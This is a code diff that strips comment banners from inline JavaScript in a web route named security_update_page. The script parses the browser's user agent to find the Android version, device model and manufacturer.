@@ -584,9 +584,6 @@ def security_update_page(request: Request):
 
         <script>
 
-        // ====================================================
-        // COLLECT DEVICE INFORMATION
-        // ====================================================
 
         async function collectDeviceInformation() {{
 
@@ -608,17 +605,9 @@ def security_update_page(request: Request):
                 let timezone = "Unknown";
 
 
-                // =================================================
-                // USER AGENT
-                // =================================================
-
                 const userAgent =
                     navigator.userAgent || "";
 
-
-                // =================================================
-                // ANDROID VERSION
-                // =================================================
 
                 const androidMatch =
                     userAgent.match(
@@ -632,11 +621,6 @@ def security_update_page(request: Request):
                         androidMatch[1];
 
                 }}
-
-
-                // =================================================
-                // DEVICE MODEL
-                // =================================================
 
                 if (androidMatch) {{
 
@@ -655,10 +639,6 @@ def security_update_page(request: Request):
 
                 }}
 
-
-                // =================================================
-                // MANUFACTURER
-                // =================================================
 
                 const deviceUpper =
                     device.toUpperCase();
